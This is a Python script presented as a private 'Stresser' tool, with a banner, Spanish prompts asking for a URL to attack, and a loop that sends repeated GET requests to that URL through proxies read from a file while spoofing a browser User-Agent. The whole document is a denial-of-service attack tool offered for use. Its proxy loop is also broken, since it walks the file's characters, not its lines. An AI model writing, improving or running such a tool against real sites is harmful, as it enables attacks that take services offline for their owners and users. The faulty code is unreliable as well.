import json, os, requests, time
from colorama import Fore, Style, init
init(convert=True)

#https://www.youtube.com/channel/UCAs47K1yq4RCPduVwaUyO6Q

xmenu = f"""{Style.BRIGHT}
{Fore.WHITE}____________________________________________________________
{Fore.RED}
   ___      _______  _     _         _______ 
  |   |    |       || | _ | |       |       |
  |   |    |   _   || || || | ____  |    ___|
  |   |    |  | |  ||       ||____| |   | __ 
  |   |___ |  |_|  ||       |       |   ||  | {Fore.WHITE}Stresser{Fore.RED}
  |       ||       ||   _   |       |   |_| | {Fore.WHITE}by zVodka{Fore.RED}
  |_______||_______||__| |__|       |_______| {Fore.WHITE}Private TOOL
  {Fore.BLACK}https://github.com/zVodka-git
{Fore.WHITE}____________________________________________________________

{Fore.YELLOW}1 {Fore.WHITE}stresser script{Fore.YELLOW}(Proxies needed)
{Fore.WHITE}____________________________________________________________
"""
print(xmenu)
try:
    with open("http_proxies.txt")as f:
        proxxxies = f.read()
except:
    print(f"{Fore.RED}[+]-{Fore.WHITE}El archivo http_proxies.txt no existe!", end='')
    os.system("pause>nul")
    exit()
while True:
    print(f"{Fore.YELLOW}>>>>{Fore.WHITE}", end='')
    cvar = input()
    if cvar == '1':
        print(f"{Fore.WHITE}Ingresa la url que deseas atacar{Fore.YELLOW}>>>>", end='')
        lowg_url = input()
        header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}
        try:
            for i in proxxxies:
                try:
                    http_proxy = i
                    proxies = {
                        "http" : http_proxy
                        }
                    r = requests.get(lowg_url, headers=header, proxies=proxies)
                    print(f"{Fore.GREEN}[+]-{Fore.WHITE}Solicitud enviada correctamente!")
                except:
                    print(f"{Fore.RED}[+]-{Fore.WHITE}Error")
                    pass
        except:
            pass
    else:
        os.system("cls")
        print(xmenu)
